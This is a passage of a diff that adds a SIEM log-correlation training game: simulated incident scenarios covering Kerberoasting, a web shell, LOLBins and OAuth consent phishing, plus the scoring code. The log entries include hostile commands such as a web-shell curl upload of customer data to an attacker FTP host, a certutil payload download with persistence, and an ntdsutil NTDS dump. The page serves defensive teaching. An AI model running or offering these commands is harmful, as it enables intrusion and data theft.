+      { time: "11:24:48", source: "TEAMS", msg: "Channel message f.alvarez in #devops: \"deploying hotfix to staging\"" },
+      { time: "11:48:22", source: "WINDOWS", msg: "Event 4624 logon user=svc_backup at DC-02, type 3 (network), src=workstation f.alvarez", malicious: true, stage: "lateral" },
+      { time: "11:49:18", source: "EDR", msg: "Process: ntdsutil.exe \"ac i ntds\" \"ifm\" on DC-02, user=svc_backup", malicious: true, stage: "impact" },
+      { time: "11:52:02", source: "BACKUP", msg: "Veeam: incremental backup of file-share-01 started" }
+    ],
+    explanation: "<strong>Kerberoasting</strong>: the attacker (using f.alvarez's session, possibly compromised earlier) requests TGS tickets for multiple service accounts in rapid succession. The key indicators: <strong>(1)</strong> burst of 4769 events within seconds, <strong>(2)</strong> RC4 encryption (<code>enc=0x17</code>) requested instead of the default AES — RC4 hashes are crackable offline, <strong>(3)</strong> targeting service accounts (SPNs) rather than user accounts. About 25 minutes later, <code>svc_backup</code> logs into DC-02 — meaning the attacker cracked the hash offline. Then <code>ntdsutil ... ifm</code> dumps the entire AD database (NTDS.dit). The legitimate web01 TGS request, the Teams message, and the Veeam backup are noise.",
+    killChain: [
+      { stage: "Credential Access", description: "Kerberoasting — TGS requests with RC4 to crack service account hashes offline" },
+      { stage: "Lateral Movement", description: "Compromised svc_backup logs into domain controller" },
+      { stage: "Credential Access (escalation)", description: "ntdsutil IFM dump — extracting the entire AD database" }
+    ]
+  },
+
+  // ────────────────────────────────────────────────────────
+  // 8. Web shell → DB dump
+  // ────────────────────────────────────────────────────────
+  {
+    title: "An Unexpected File Under /uploads/",
+    difficulty: 2,
+    briefing: "The public-facing customer portal had a vulnerability in its file upload handler — patched two days ago. Today the WAF flagged something. Trace what got in before the patch and what they did with it.",
+    events: [
+      { time: "06:14:02", source: "WAF", msg: "Block: SQL injection attempt on /search?q= from 91.218.114.4" },
+      { time: "06:18:33", source: "WEB", msg: "POST /portal/upload.php from 91.218.114.4, file=invoice.php (uploaded 3 days ago, still on disk)", malicious: true, stage: "persistence" },
+      { time: "06:18:47", source: "WEB", msg: "GET /portal/uploads/invoice.php?cmd=whoami from 91.218.114.4, 200 OK", malicious: true, stage: "execution" },
+      { time: "06:19:02", source: "WEB", msg: "GET /portal/uploads/invoice.php?cmd=ls+-la+/etc from 91.218.114.4, 200 OK", malicious: true, stage: "recon" },
+      { time: "06:19:14", source: "WEB", msg: "GET /portal/css/main.css from 188.114.97.7, 200 OK" },
+      { time: "06:21:33", source: "WEB", msg: "GET /portal/uploads/invoice.php?cmd=cat+/var/www/config/db.conf from 91.218.114.4, 200 OK", malicious: true, stage: "access" },
+      { time: "06:22:48", source: "DATABASE", msg: "Connection from web-srv-02 to customer_db, user=portal_app (normal app pattern)" },
+      { time: "06:24:11", source: "DATABASE", msg: "Query: SELECT * FROM customers; from web-srv-02 user=portal_app (89,224 rows returned)", malicious: true, stage: "exfil" },
+      { time: "06:24:48", source: "WEB", msg: "GET /portal/uploads/invoice.php?cmd=curl+-T+/tmp/cust.csv+ftp://91.218.114.4/ from 91.218.114.4, 200 OK", malicious: true, stage: "exfil" },
+      { time: "06:31:02", source: "WAF", msg: "Block: SQL injection attempt on /login from 45.142.193.81 (different actor, automated scan)" }
+    ],
+    explanation: "A <strong>web shell</strong> was uploaded three days ago when the vuln was still open. Today the attacker comes back to use it. The chain: <code>upload.php</code> dropped <code>invoice.php</code> (web shell), then the attacker executes commands through it (<code>whoami</code>, <code>ls /etc</code>, reads the DB config), uses the now-known credentials to dump the customer table, and exfils via FTP. The WAF SQL injection blocks (at 06:14 and 06:31) are <strong>different actors entirely</strong> — the URLs and IPs don't match the chain. <strong>Lesson:</strong> patching the vulnerability doesn't remove files the attacker already dropped — incident response must include filesystem review.",
+    killChain: [
+      { stage: "Initial Access (legacy)", description: "Web shell uploaded 3 days ago before the upload vuln was patched" },
+      { stage: "Execution", description: "Commands executed via cmd= parameter on the web shell" },
+      { stage: "Discovery", description: "Filesystem and config file enumeration" },
+      { stage: "Collection", description: "Customer table dumped (89k rows) using stolen DB credentials" },
+      { stage: "Exfiltration", description: "Data uploaded via FTP back to the attacker" }
+    ]
+  },
+
+  // ────────────────────────────────────────────────────────
+  // 9. LOLBins + scheduled task persistence
+  // ────────────────────────────────────────────────────────
+  {
+    title: "Living Off the Land",
+    difficulty: 3,
+    briefing: "Endpoint protection didn't fire — no malware on disk. But something feels off about HOST-MKT-04. Look for an attacker using only built-in Windows binaries.",
+    events: [
+      { time: "15:02:11", source: "PROXY", msg: "GET https://drive.google.com/uc?id=1a2b3c4d from HOST-MKT-04 user=p.rashid (allowed, file-sharing)", malicious: true, stage: "access" },
+      { time: "15:04:33", source: "EDR", msg: "certutil.exe -urlcache -split -f https://transfer.sh/xY8q2/payload.txt C:\\ProgramData\\update.dll on HOST-MKT-04", malicious: true, stage: "execution" },
+      { time: "15:05:18", source: "EDR", msg: "rundll32.exe C:\\ProgramData\\update.dll,StartW on HOST-MKT-04", malicious: true, stage: "execution" },
+      { time: "15:06:02", source: "PROXY", msg: "GET https://www.linkedin.com/feed/ from HOST-MKT-04 user=p.rashid (allowed)" },
+      { time: "15:11:48", source: "EDR", msg: "schtasks.exe /create /tn \"Adobe Update Service\" /tr \"rundll32 C:\\ProgramData\\update.dll,StartW\" /sc onlogon on HOST-MKT-04", malicious: true, stage: "persistence" },
+      { time: "15:13:22", source: "EDR", msg: "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v AdobeUpd /d ... on HOST-MKT-04 user=p.rashid", malicious: true, stage: "persistence" },
+      { time: "15:18:11", source: "FIREWALL", msg: "ALLOW HOST-MKT-04 → 198.51.100.42:443 (TLS, ~2KB every 5 min pattern)", malicious: true, stage: "execution" },
+      { time: "15:24:48", source: "PROXY", msg: "POST https://teams.microsoft.com/api/... from HOST-MKT-04 (normal)" },
+      { time: "15:31:02", source: "EDR", msg: "Microsoft Defender: Real-time protection ON, signatures up to date" },
+      { time: "15:42:18", source: "DHCP", msg: "Lease renewed for HOST-MKT-04" }
+    ],
+    explanation: "<strong>Living-off-the-land binaries (LOLBins)</strong>: the attacker uses only signed Microsoft tools to avoid AV detection. The chain: <code>certutil</code> abused as a downloader (not its legitimate certificate purpose) to pull a payload disguised as a .txt file, <code>rundll32</code> executes the downloaded DLL, then <strong>dual persistence</strong> — both a scheduled task and a Run key (so removing one still leaves the other). The C2 beacon pattern (~2KB every 5 min) confirms an active backdoor. LinkedIn, Teams, the Defender status report, and DHCP renewal are all expected behavior. <strong>Detection insight:</strong> EDR catches LOLBin chains by looking at <em>process lineage</em> (certutil downloading from transfer.sh is suspicious regardless of signature) and <em>command-line arguments</em>, not just file hashes.",
+    killChain: [
+      { stage: "Execution", description: "certutil abused as downloader, rundll32 executes the DLL payload" },
+      { stage: "Persistence", description: "Dual mechanism: scheduled task + Run registry key" },
+      { stage: "C2", description: "Low-volume beaconing on standard HTTPS port to blend with normal traffic" }
+    ]
+  },
+
+  // ────────────────────────────────────────────────────────
+  // 10. OAuth abuse
+  // ────────────────────────────────────────────────────────
+  {
+    title: "The App Nobody Installed",
+    difficulty: 2,
+    briefing: "Audit log review caught your eye: a new OAuth application appeared in the tenant overnight. No one in IT recognizes it. Reconstruct what happened.",
+    events: [
+      { time: "19:33:42", source: "EMAIL", msg: "Inbound message to s.nakamura@corp.com subject:\"DocuSign — Action Required: Q4 Compensation\" sender:docusign-secure@docusing-portal.com", malicious: true, stage: "access" },
+      { time: "19:34:18", source: "PROXY", msg: "GET https://docusing-portal.com/sign?id=abc123 from HOST-LEG-22 user=s.nakamura", malicious: true, stage: "access" },
+      { time: "19:34:51", source: "AAD-CONSENT", msg: "OAuth consent prompted: app \"DocuSign Secure Sign\" requests: Mail.Read, Mail.Send, Files.Read.All, offline_access; user=s.nakamura", malicious: true, stage: "access" },
+      { time: "19:35:02", source: "AAD-CONSENT", msg: "OAuth consent GRANTED user=s.nakamura → app \"DocuSign Secure Sign\" (publisher unverified)", malicious: true, stage: "persistence" },
+      { time: "19:36:14", source: "EMAIL", msg: "Inbound message to multiple users, marketing newsletter (legitimate)" },
+      { time: "19:48:33", source: "GRAPH-API", msg: "App \"DocuSign Secure Sign\" enumerated 8,442 messages in mailbox s.nakamura via Mail.Read", malicious: true, stage: "recon" },
+      { time: "19:51:11", source: "GRAPH-API", msg: "App \"DocuSign Secure Sign\" listed OneDrive contents user=s.nakamura, 1,203 files indexed", malicious: true, stage: "recon" },
+      { time: "20:14:22", source: "AAD", msg: "User m.kowalski password reset via self-service, normal flow" },
+      { time: "21:08:48", source: "GRAPH-API", msg: "App \"DocuSign Secure Sign\" sent 47 emails as s.nakamura to external recipients via Mail.Send", malicious: true, stage: "impact" },
+      { time: "22:14:02", source: "BACKUP", msg: "Nightly mailbox backup completed" }
+    ],
+    explanation: "<strong>Illicit consent grant attack</strong> (also called OAuth phishing). The attacker doesn't try to steal a password — they trick the user into <em>granting an app permission</em> to their mailbox. The phishing email points to a typosquatted domain (<code>docusing-portal.com</code>, note the missing <code>n</code>), which redirects to a Microsoft OAuth consent screen for a malicious app requesting <code>Mail.Read</code>, <code>Mail.Send</code>, <code>Files.Read.All</code>, and <code>offline_access</code> (= persistent refresh tokens). Once consented, the app uses Graph API to read mail, list OneDrive, and send phishing onward to external recipients — all without ever needing the user's password, and MFA doesn't help. The self-service password reset for m.kowalski and the nightly backup are unrelated. <strong>Detection cues:</strong> unverified publisher, sensitive scopes, and behavior right after consent.",
+    killChain: [
+      { stage: "Initial Access", description: "Phishing email leads to a typosquatted DocuSign-themed consent page" },
+      { stage: "Persistence", description: "OAuth consent granted to malicious app — token persists across MFA, password resets" },
+      { stage: "Collection", description: "Graph API used to enumerate mailbox and OneDrive contents" },
+      { stage: "Impact", description: "Phishing emails sent onward from the compromised account" }
+    ]
+  }
+];
+
+// ============================================================
+// STATE
+// ============================================================
+const STORAGE_KEY = "siem-correlation-practice-v1";
+
+let state = {
+  currentScenario: 0,
+  selections: {},          // { scenarioIdx: Set of event indices }
+  results: {},             // { scenarioIdx: { score, total, correct, wrong, missed } }
+  submitted: {}            // { scenarioIdx: true } once submitted
+};
+
+function loadState() {
+  try {
+    const raw = localStorage.getItem(STORAGE_KEY);
+    if (!raw) return;
+    const saved = JSON.parse(raw);
+    if (typeof saved.currentScenario === "number") state.currentScenario = saved.currentScenario;
+    if (saved.selections) {
+      Object.keys(saved.selections).forEach(k => {
+        state.selections[k] = new Set(saved.selections[k]);
+      });
+    }
+    if (saved.results) state.results = saved.results;
+    if (saved.submitted) state.submitted = saved.submitted;
+  } catch (e) { /* ignore */ }
+}
+
+function saveState() {
+  try {
+    const serializable = {
+      currentScenario: state.currentScenario,
+      selections: {},
+      results: state.results,
+      submitted: state.submitted
+    };
+    Object.keys(state.selections).forEach(k => {
+      serializable.selections[k] = Array.from(state.selections[k]);
+    });
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(serializable));
+  } catch (e) { /* ignore */ }
+}
+
+function getSelections(idx) {
+  if (!state.selections[idx]) state.selections[idx] = new Set();
+  return state.selections[idx];
+}
+
+// ============================================================
+// RENDER: scenario picker
+// ============================================================
+function renderScenarioGrid() {
+  const grid = document.getElementById("scenarioGrid");
+  grid.innerHTML = "";
+  SCENARIOS.forEach((sc, i) => {
+    const btn = document.createElement("button");
+    btn.type = "button";
+    btn.className = "scenario-btn";
+    if (i === state.currentScenario) btn.classList.add("active");
+    if (state.submitted[i]) btn.classList.add("completed");
+    btn.setAttribute("role", "tab");
+    btn.setAttribute("aria-selected", i === state.currentScenario ? "true" : "false");
+    btn.setAttribute("aria-label", `Scenario ${i+1}: ${sc.title}` + (state.submitted[i] ? " (completed)" : ""));
+    btn.textContent = String(i + 1);
+    btn.addEventListener("click", () => {
+      state.currentScenario = i;
+      saveState();
+      renderScenarioGrid();
+      renderScenario();
+      document.getElementById("scenarioPanel").scrollIntoView({ behavior: "smooth", block: "start" });
+    });
+    grid.appendChild(btn);
+  });
+}
+
+// ============================================================
+// RENDER: scenario panel
+// ============================================================
+function renderScenario() {
+  const idx = state.currentScenario;
+  const sc = SCENARIOS[idx];
+  const panel = document.getElementById("scenarioPanel");
+  const isSubmitted = !!state.submitted[idx];
+  const selections = getSelections(idx);
+
+  const diffLabel = ["", "Beginner", "Intermediate", "Advanced"][sc.difficulty];
+
+  let html = `
+    <div class="scenario-header">
+      <h2 class="scenario-title">Scenario ${idx + 1}: ${sc.title}</h2>
+      <div class="scenario-meta">
+        <span class="meta-chip diff-${sc.difficulty}">${diffLabel}</span>
+        <span class="meta-chip">${sc.events.length} log events</span>
+      </div>
+    </div>
+    <p class="briefing">${sc.briefing}</p>
+    <div class="console" role="list" aria-label="Log events — click each event you believe is part of the attack chain">
+  `;
+
+  sc.events.forEach((ev, i) => {
+    const selected = selections.has(i);
+    const malicious = !!ev.malicious;
+    let cls = "log-row";
+    let marker = "";
+    if (selected) cls += " selected";
+    if (isSubmitted) {
+      if (selected && malicious) { cls += " revealed-correct"; marker = "✓"; }
+      else if (selected && !malicious) { cls += " revealed-incorrect"; marker = "✗"; }
+      else if (!selected && malicious) { cls += " revealed-missed"; marker = "!"; }
+    }
+
+    html += `
+      <div class="${cls}" role="listitem" tabindex="0" data-event-idx="${i}" aria-pressed="${selected}">
+        ${isSubmitted ? `<span class="marker" aria-hidden="true">${marker}</span>` : ""}
+        <span class="time">${ev.time}</span>
+        <span class="source">[${ev.source}]</span>
+        <span class="msg">${escapeHTML(ev.msg)}</span>
+      </div>
+    `;
+  });
+
+  html += `</div>`;
+
+  // Controls
+  html += `
+    <div class="controls">
+      <div class="selection-count">
+        Selected: <strong id="selectionCount">${selections.size}</strong> of ${sc.events.length}
+      </div>
+      ${isSubmitted ? "" : `
+        <button type="button" class="btn btn-secondary" id="resetBtn">Reset</button>
+        <button type="button" class="btn btn-primary" id="submitBtn"${selections.size === 0 ? " disabled" : ""}>Check My Correlation</button>
+      `}
+      ${isSubmitted ? `
+        <button type="button" class="btn btn-secondary" id="retryBtn">Try Again</button>
+      ` : ""}
+    </div>
+  `;
+
+  // Feedback after submit
+  if (isSubmitted) {
+    const r = state.results[idx];
+    let scoreClass = "score-poor";
+    let headline = "";
+    if (r.correct === r.totalMalicious && r.wrong === 0) {
+      scoreClass = "score-perfect";
+      headline = "Excellent correlation.";
+    } else if (r.correct >= r.totalMalicious && r.wrong <= 1) {
+      scoreClass = "score-good";
+      headline = "Good correlation — minor over-flagging.";
+    } else if (r.correct >= Math.ceil(r.totalMalicious / 2)) {
+      scoreClass = "score-partial";
+      headline = "Partial credit — review what you missed.";
+    } else {
+      scoreClass = "score-poor";
+      headline = "Review the chain — most of the attack went unflagged.";
+    }
+
+    html += `
+      <div class="feedback ${scoreClass}" role="status">
+        <h4>${headline}</h4>
+        <div class="score-line">
+          <strong>${r.correct}</strong> of <strong>${r.totalMalicious}</strong> malicious events flagged correctly
+          &nbsp;·&nbsp; <strong>${r.wrong}</strong> false positives
+          &nbsp;·&nbsp; Score: <strong>${r.score}</strong> / ${r.totalMalicious * 10}
+        </div>
+        <p class="explanation">${sc.explanation}</p>
+        <div class="kill-chain">
+          <h5>Reconstructed Attack Chain</h5>
+          <ol>
+            ${sc.killChain.map(k => `<li><span class="stage">${k.stage}</span>${escapeHTML(k.description)}</li>`).join("")}
+          </ol>
+        </div>
+      </div>
+    `;
+  }
+
+  // Nav row
+  html += `
+    <div class="nav-row" style="margin-top: 18px;">
+      <button type="button" class="btn btn-secondary" id="prevBtn"${idx === 0 ? " disabled" : ""}>← Previous</button>
+      <button type="button" class="btn btn-secondary" id="nextBtn"${idx === SCENARIOS.length - 1 ? " disabled" : ""}>Next →</button>
+    </div>
+  `;
+
+  panel.innerHTML = html;
+
+  // Bind events
+  panel.querySelectorAll(".log-row").forEach(row => {
+    if (isSubmitted) return; // locked after submit
+    row.addEventListener("click", () => toggleEvent(parseInt(row.dataset.eventIdx, 10)));
+    row.addEventListener("keydown", (e) => {
+      if (e.key === " " || e.key === "Enter") {
+        e.preventDefault();
+        toggleEvent(parseInt(row.dataset.eventIdx, 10));
+      }
+    });
+  });
+
+  const submitBtn = document.getElementById("submitBtn");
+  if (submitBtn) submitBtn.addEventListener("click", submitScenario);
+
+  const resetBtn = document.getElementById("resetBtn");
+  if (resetBtn) resetBtn.addEventListener("click", resetScenario);
+
+  const retryBtn = document.getElementById("retryBtn");
+  if (retryBtn) retryBtn.addEventListener("click", retryScenario);
+
+  const prevBtn = document.getElementById("prevBtn");
+  if (prevBtn) prevBtn.addEventListener("click", () => navigateScenario(-1));
+
+  const nextBtn = document.getElementById("nextBtn");
+  if (nextBtn) nextBtn.addEventListener("click", () => navigateScenario(1));
+
+  updateHeaderProgress();
+}
+
+function escapeHTML(str) {
+  return String(str)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#039;");
+}
+
+// ============================================================
+// INTERACTION
+// ============================================================
+function toggleEvent(eventIdx) {
+  const idx = state.currentScenario;
+  const sels = getSelections(idx);
+  if (sels.has(eventIdx)) sels.delete(eventIdx);
+  else sels.add(eventIdx);
+  saveState();
+  renderScenario();
+}
+
+function submitScenario() {
+  const idx = state.currentScenario;
+  const sc = SCENARIOS[idx];
+  const sels = getSelections(idx);
+
+  let correct = 0, wrong = 0, missed = 0;
+  const totalMalicious = sc.events.filter(e => e.malicious).length;
+
+  sc.events.forEach((ev, i) => {
+    const selected = sels.has(i);
+    if (selected && ev.malicious) correct++;
+    else if (selected && !ev.malicious) wrong++;
+    else if (!selected && ev.malicious) missed++;
+  });
+
+  // Score: 10 points per correct, -5 per false positive (floor at 0)
+  const score = Math.max(0, correct * 10 - wrong * 5);
+
+  state.submitted[idx] = true;
+  state.results[idx] = { correct, wrong, missed, totalMalicious, score };
+  saveState();
+  renderScenarioGrid();
+  renderScenario();
+}
+
+function resetScenario() {
+  const idx = state.currentScenario;
+  state.selections[idx] = new Set();
+  saveState();
+  renderScenario();
+}
+
+function retryScenario() {
+  const idx = state.currentScenario;
+  state.selections[idx] = new Set();
+  delete state.submitted[idx];
+  delete state.results[idx];
+  saveState();
+  renderScenarioGrid();
+  renderScenario();
+}
+
+function navigateScenario(delta) {
+  const next = state.currentScenario + delta;
+  if (next < 0 || next >= SCENARIOS.length) return;
+  state.currentScenario = next;
+  saveState();
+  renderScenarioGrid();
+  renderScenario();
+  document.getElementById("scenarioPanel").scrollIntoView({ behavior: "smooth", block: "start" });
+}
+
+function updateHeaderProgress() {
+  const completed = Object.keys(state.submitted).length;
+  const totalScore = Object.values(state.results).reduce((sum, r) => sum + (r.score || 0), 0);
+  document.getElementById("completedCount").textContent = completed;
+  document.getElementById("totalCount").textContent = SCENARIOS.length;
+  document.getElementById("totalScore").textContent = totalScore;
+}
+
+// ============================================================
+// INIT
+// ============================================================
+loadState();
+renderScenarioGrid();
+renderScenario();
+</script>
+</body>
+</html>
